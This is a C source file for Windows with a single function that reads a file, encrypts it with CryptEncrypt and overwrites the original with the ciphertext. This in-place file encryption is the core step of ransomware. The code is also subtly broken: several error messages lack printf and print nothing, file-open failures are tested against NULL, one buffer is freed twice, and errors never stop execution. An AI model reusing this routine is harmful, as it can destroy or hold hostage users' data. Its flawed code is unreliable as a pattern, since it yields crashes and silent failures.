#include <stdio.h>
#include <Windows.h>
#include "keyDef.h"

int encryptor(char* filePath, key keyStruct) {


	HANDLE hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL) {
		("\n(!) Failed to open file, Error: %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully opened file");
	}

	LARGE_INTEGER fileSize;
	if (!GetFileSizeEx(hFile, &fileSize)) {
		("\n(!) Failed to get size of file, Error: %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully got size of file %i", fileSize.QuadPart);
	}

	char* fileData = (char*)malloc(3 * fileSize.QuadPart);
	DWORD readSize = 0;

	if (!ReadFile(hFile, fileData, fileSize.QuadPart, &readSize, NULL)) {
		printf("\n(!) Error reading file - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully read file %i", readSize);
	}

	char* newFileData = (char*)realloc(fileData, 3 * readSize);
	fileData = newFileData;

	DWORD encryptedSize = readSize;
	if (!CryptEncrypt(keyStruct.hKey, 0, TRUE, 0, (BYTE*)fileData, &encryptedSize, (2 * readSize) + 16)) {
		printf("\n(!) Error encrypting data - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully encrypted data %i", encryptedSize);
	}

	if (!CloseHandle(hFile)) {
		printf("\n(!) Error closing file handle - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully closed file handle");
	}

	HANDLE hNewFile = CreateFileA(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hNewFile == NULL) {
		printf("\n(!) Failed to create new file, Error: %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully created new file");
	}

	DWORD writtenBytes = NULL;
	if (hNewFile != NULL) {
		if (!WriteFile(hNewFile, fileData, encryptedSize, &writtenBytes, NULL)) {
			printf("\n(!) Error putting content in new file - %lu", GetLastError());
		} else {
			printf("\n(+) Succesfully put content in new file");
		}
	} else {
		printf("\n(!) Error putting content in new file - %lu", GetLastError());
	}
	free(fileData);
	free(newFileData);

	if (!CloseHandle(hNewFile)) {
		printf("\n(!) Error closing new file handle - %lu\n", GetLastError());
	} else {
		printf("\n(+) Succesfully closed new file handle\n");
	}

	return 0;
}

